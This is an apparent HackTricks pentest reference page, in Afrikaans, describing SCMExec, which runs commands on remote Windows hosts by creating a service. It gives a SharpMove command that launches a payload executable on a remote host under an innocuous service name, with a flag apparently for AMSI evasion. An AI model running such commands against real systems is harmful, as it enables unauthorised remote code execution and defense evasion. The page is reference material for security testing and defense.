# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** is 'n tegniek om op afstand op stelsels opdragte uit te voer deur die Service Control Manager (SCM) te gebruik om 'n diens te skep wat die opdrag uitvoer. Hierdie metode kan sommige sekuriteitsbeheermaatreëls omseil, soos User Account Control (UAC) en Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
